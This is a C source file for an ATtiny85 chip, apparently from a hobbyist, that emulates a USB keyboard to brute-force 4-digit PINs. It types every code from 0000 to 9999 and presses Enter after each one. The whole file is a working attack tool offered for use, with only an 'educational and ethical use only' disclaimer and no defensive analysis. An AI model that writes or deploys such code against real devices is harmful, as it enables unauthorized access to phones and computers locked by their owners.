/*
 * USB Password Cracker for ATtiny85
 * ---------------------------------
 * Developed by: CHRIZ (a.k.a. chriz_3656)
 * Website: 
 * Instagram: @chriz_3656
 * GitHub: github.com/chrizmonsaji.github.io/
 *
 * Description:
 *   This program emulates a USB HID keyboard to brute-force
 *   4-digit PIN combinations using V-USB on an ATtiny85 chip.
 *
 * License: MIT / Custom – For educational and ethical use only.
 */

#include <avr/io.h>
#include <util/delay.h>
#include <avr/interrupt.h>
#include "usbdrv.h"

static uchar reportBuffer[8] = {0};  // USB HID report buffer

#define ATTEMPT_DELAY_MS 1000
uint16_t currentCode = 0;

void sendKey(uchar keycode) {
    usbPoll();
    reportBuffer[0] = 0; // Modifier
    reportBuffer[2] = keycode;
    usbSetInterrupt(reportBuffer, sizeof(reportBuffer));
    _delay_ms(5);
    reportBuffer[2] = 0; // Release
    usbSetInterrupt(reportBuffer, sizeof(reportBuffer));
    _delay_ms(5);
}

void sendDigit(uint8_t digit) {
    sendKey(0x27 + digit); // HID keycode for '0' is 0x27
}

void sendEnter() {
    sendKey(0x28); // HID keycode for Enter
}

void tryPassword(uint16_t num) {
    uint8_t d1 = (num / 1000) % 10;
    uint8_t d2 = (num / 100) % 10;
    uint8_t d3 = (num / 10) % 10;
    uint8_t d4 = num % 10;

    sendDigit(d1); _delay_ms(100);
    sendDigit(d2); _delay_ms(100);
    sendDigit(d3); _delay_ms(100);
    sendDigit(d4); _delay_ms(100);
    sendEnter(); _delay_ms(ATTEMPT_DELAY_MS);
}

int main(void) {
    uchar i;
    usbInit();
    usbDeviceDisconnect();
    for(i = 0; i < 250; i++) _delay_ms(2); // 500ms total
    usbDeviceConnect();
    sei();

    while (1) {
        usbPoll();

        if (currentCode <= 9999) {
            tryPassword(currentCode);
            currentCode++;
        } else {
            while (1) usbPoll(); // done
        }
    }
}
